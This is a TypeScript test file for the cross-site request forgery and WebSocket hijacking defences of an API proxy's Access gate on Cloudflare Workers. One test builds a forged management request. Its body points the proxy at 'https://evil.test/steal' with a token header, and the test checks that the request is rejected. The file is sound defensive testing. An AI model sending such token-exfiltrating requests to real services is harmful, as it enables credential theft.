// Cross-site request forgery and cross-site WebSocket hijacking protections of the Access gate (src/access/csrf.ts):
// the pure decision table, then the production Worker through `exports.default.fetch` (dev bypass on localhost, see
// vitest.config.ts) for the panel, management writes, proxy routes and Responses WebSocket upgrades.
import { exports } from "cloudflare:workers";
import { beforeEach, describe, expect, it } from "vitest";
import { crossSiteRejection } from "../src/access/csrf.ts";
import { resetControlPlane } from "./support/management.ts";

const PROXY = "https://proxy.example.com";

type Zone = "protected" | "management";

const check = (
  method: string,
  path: string,
  headers: Record<string, string> = {},
  zone: Zone = "protected",
) => crossSiteRejection(method, headers, `${PROXY}${path}`, zone)?.status;

const write = (method: string, path: string, headers: Record<string, string>) =>
  check(method, path, headers, "management");

describe("crossSiteRejection", () => {
  it("lets non-browser clients through (no Origin, no Sec-Fetch-*)", () => {
    expect(
      check("POST", "/v1/chat/completions", { "content-type": "application/json" }),
    ).toBeUndefined();
    expect(check("POST", "/v1/messages", {})).toBeUndefined();
    expect(check("GET", "/v1/responses", { upgrade: "websocket" })).toBeUndefined();
    expect(
      check(
        "PUT",
        "/v8/management/config.yaml",
        { "content-type": "application/yaml" },
        "management",
      ),
    ).toBe(undefined);
  });

  it("lets same-origin browser requests through", () => {
    const sameOrigin = {
      origin: PROXY,
      "sec-fetch-site": "same-origin",
      "content-type": "application/json",
    };

    expect(check("POST", "/v1/chat/completions", sameOrigin)).toBeUndefined();
    expect(
      check("POST", "/v8/management/requests/api-call", sameOrigin, "management"),
    ).toBeUndefined();
    expect(
      check("GET", "/v8/management/config", { "sec-fetch-site": "same-origin" }, "management"),
    ).toBeUndefined();
    expect(check("GET", "/v1/responses", { upgrade: "websocket", origin: PROXY })).toBeUndefined();
    // A user typing the URL / a bookmark.
    expect(
      check(
        "GET",
        "/management.html",
        { "sec-fetch-site": "none", "sec-fetch-mode": "navigate" },
        "management",
      ),
    ).toBeUndefined();
  });

  it("refuses state-changing cross-site requests on protected and management zones", () => {
    for (const zone of ["protected", "management"] as const) {
      const path =
        zone === "protected" ? "/v1/chat/completions" : "/v8/management/requests/api-call";

      const json = { "content-type": "application/json" };
      expect(check("POST", path, { ...json, origin: "https://evil.test" }, zone)).toBe(403);
      expect(check("POST", path, { ...json, origin: "null" }, zone)).toBe(403);
      expect(
        check("POST", path, { ...json, origin: "https://proxy.example.com.evil.test" }, zone),
      ).toBe(403);
      expect(check("POST", path, { ...json, "sec-fetch-site": "cross-site" }, zone)).toBe(403);
      expect(check("POST", path, { ...json, "sec-fetch-site": "same-site" }, zone)).toBe(403);
      expect(check("DELETE", path, { origin: "https://evil.test" }, zone)).toBe(403);
    }

    // Reads of proxy routes from other origins stay possible (CORS `*` without credentials).
    expect(
      check("GET", "/v1/models", { origin: "https://app.test", "sec-fetch-site": "cross-site" }),
    ).toBeUndefined();
  });

  it("refuses cross-origin WebSocket upgrades", () => {
    const upgrade = { upgrade: "websocket", connection: "Upgrade" };
    expect(check("GET", "/v1/responses", { ...upgrade, origin: "https://evil.test" })).toBe(403);
    expect(
      check("GET", "/backend-api/codex/responses", {
        ...upgrade,
        origin: "http://proxy.example.com:8080",
      }),
    ).toBe(403);
    expect(check("GET", "/v1/responses", { ...upgrade, origin: "null" })).toBe(403);
  });

  it("refuses cross-site management reads except top-level navigations", () => {
    expect(
      check("GET", "/v8/management/config", { origin: "https://evil.test" }, "management"),
    ).toBe(403);
    expect(
      check("GET", "/v8/management/config", { "sec-fetch-site": "cross-site" }, "management"),
    ).toBe(403);

    // `queue` pops records on GET: an <img> from another site must not reach it.
    const image = {
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "no-cors",
      "sec-fetch-dest": "image",
    };

    expect(check("GET", "/v8/management/observability/usage/queue", image, "management")).toBe(403);
    const link = { "sec-fetch-site": "cross-site", "sec-fetch-mode": "navigate" };
    expect(check("GET", "/management.html", link, "management")).toBeUndefined();
  });

  it("requires JSON (multipart for uploads, YAML for config.yaml) on management writes", () => {
    expect(
      write("POST", "/v8/management/requests/api-call", {
        "content-type": "application/json; charset=utf-8",
      }),
    ).toBeUndefined();
    expect(
      write("PATCH", "/v8/management/config", { "content-type": "application/merge-patch+json" }),
    ).toBeUndefined();
    expect(
      write("POST", "/v8/management/requests/api-call", { "content-type": "text/plain" }),
    ).toBe(415);
    expect(
      write("POST", "/v8/management/requests/api-call", {
        "content-type": "application/x-www-form-urlencoded",
      }),
    ).toBe(415);
    expect(
      write("POST", "/v8/management/credentials", {
        "content-type": "multipart/form-data; boundary=x",
      }),
    ).toBe(undefined);
    expect(
      write("POST", "/v8/management/oauth/callback", {
        "content-type": "multipart/form-data; boundary=x",
      }),
    ).toBe(415);
    expect(
      write("PUT", "/v8/management/config.yaml", { "content-type": "text/yaml" }),
    ).toBeUndefined();
    expect(write("PUT", "/v8/management/config", { "content-type": "application/yaml" })).toBe(415);
    // Bodies without a type are refused; bodiless writes (`DELETE ?name=`, `POST .../refresh`) are fine.
    expect(write("POST", "/v8/management/requests/api-call", { "content-length": "12" })).toBe(415);
    expect(
      write("POST", "/v8/management/credentials/refresh", { "transfer-encoding": "chunked" }),
    ).toBe(415);
    expect(write("DELETE", "/v8/management/credentials", {})).toBeUndefined();
    expect(
      write("POST", "/v8/management/credentials/refresh", { "content-length": "0" }),
    ).toBeUndefined();
  });
});

// --- production Worker ----------------------------------------------------------------------------------------------

const LOCAL = "http://localhost";

const worker = (path: string, init: RequestInit = {}) =>
  exports.default.fetch(new Request(`${LOCAL}${path}`, init));

const errorOf = async (response: Response) => ((await response.json()) as { error: unknown }).error;

describe("Worker entry point: cross-site protections", () => {
  beforeEach(async () => {
    await resetControlPlane();
  });

  it("serves the panel and its same-origin JSON requests", async () => {
    const panel = await worker("/management.html", {
      headers: { "sec-fetch-site": "none", "sec-fetch-mode": "navigate" },
    });

    expect(panel.status).not.toBe(403);
    expect(panel.headers.get("access-control-allow-origin")).toBeNull();
    await panel.body?.cancel();

    const panelHeaders = {
      origin: LOCAL,
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
    };

    const config = await worker("/v8/management/config", { headers: panelHeaders });
    expect(config.status).toBe(200);
    expect(config.headers.get("access-control-allow-origin")).toBeNull();
    await config.body?.cancel();

    // The panel's api-call probe reaches the handler (which validates the body).
    const probe = await worker("/v8/management/requests/api-call", {
      method: "POST",
      headers: { ...panelHeaders, "content-type": "application/json" },
      body: JSON.stringify({ url: "https://example.com" }),
    });

    expect(probe.status).toBe(400);
    expect(await errorOf(probe)).toBe("missing method");

    const yaml = await worker("/v8/management/config.yaml", {
      method: "PUT",
      headers: { ...panelHeaders, "content-type": "application/yaml" },
      body: "routing:\n  strategy: fill-first\n",
    });

    expect(yaml.status).toBe(200);
    await yaml.body?.cancel();
  });

  it("keeps management working for curl-style clients without Origin", async () => {
    const response = await worker("/v8/management/config", {
      method: "PATCH",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ routing: { strategy: "fill-first" } }),
    });

    expect(response.status).toBe(200);
    await response.body?.cancel();
  });

  it("refuses forged management writes from other sites before they reach a handler", async () => {
    const forged = await worker("/v8/management/requests/api-call", {
      method: "POST",
      headers: {
        origin: "https://evil.test",
        "sec-fetch-site": "cross-site",
        "content-type": "text/plain",
      },
      body: JSON.stringify({
        method: "GET",
        url: "https://evil.test/steal",
        header: { a: "$TOKEN$" },
        auth_index: "x",
      }),
    });

    expect(forged.status).toBe(403);
    expect(await errorOf(forged)).toBe("Cross-site request rejected");
    expect(forged.headers.get("access-control-allow-origin")).toBeNull();

    const upload = new FormData();
    upload.append("file", new File(['{"type":"claude","access_token":"x"}'], "claude-evil.json"));

    const forgedUpload = await worker("/v8/management/credentials", {
      method: "POST",
      headers: { origin: "https://evil.test" },
      body: upload,
    });

    expect(forgedUpload.status).toBe(403);
    await forgedUpload.body?.cancel();
    const list = await worker("/v8/management/credentials");
    expect(JSON.stringify(await list.json())).not.toContain("claude-evil");

    // Simple (preflight-free) content types are refused even without browser headers.
    const simple = await worker("/v8/management/config", {
      method: "PUT",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: "routing=x",
    });

    expect(simple.status).toBe(415);
    await simple.body?.cancel();

    // Cross-origin preflights get no CORS grant, so browsers never send the real request.
    const preflight = await worker("/v8/management/requests/api-call", {
      method: "OPTIONS",
      headers: { origin: "https://evil.test", "access-control-request-method": "POST" },
    });

    expect(preflight.headers.get("access-control-allow-origin")).toBeNull();
  });

  it("refuses cross-site proxy writes but keeps CORS for reads", async () => {
    const forged = await worker("/v1/chat/completions", {
      method: "POST",
      headers: { origin: "https://evil.test", "content-type": "application/json" },
      body: JSON.stringify({ model: "m", messages: [] }),
    });

    expect(forged.status).toBe(403);
    expect(forged.headers.get("access-control-allow-origin")).toBe("*");
    await forged.body?.cancel();

    const models = await worker("/v1/models", { headers: { origin: "https://app.test" } });
    expect(models.status).toBe(200);
    expect(models.headers.get("access-control-allow-origin")).toBe("*");
    await models.body?.cancel();
  });

  it("refuses cross-origin Responses WebSocket upgrades and accepts same-origin and Origin-less ones", async () => {
    for (const path of ["/v1/responses", "/backend-api/codex/responses"]) {
      const hijack = await worker(path, {
        headers: { upgrade: "websocket", origin: "https://evil.test" },
      });

      expect(hijack.status).toBe(403);
      expect(hijack.webSocket).toBeNull();
      expect(await errorOf(hijack)).toBe("Cross-origin WebSocket rejected");

      for (const headers of [{ upgrade: "websocket" }, { upgrade: "websocket", origin: LOCAL }]) {
        const accepted = await worker(path, { headers });
        expect(accepted.status).toBe(101);
        const socket = accepted.webSocket;
        expect(socket).not.toBeNull();
        socket?.accept();
        socket?.close(1000, "done");
      }
    }
  });
});
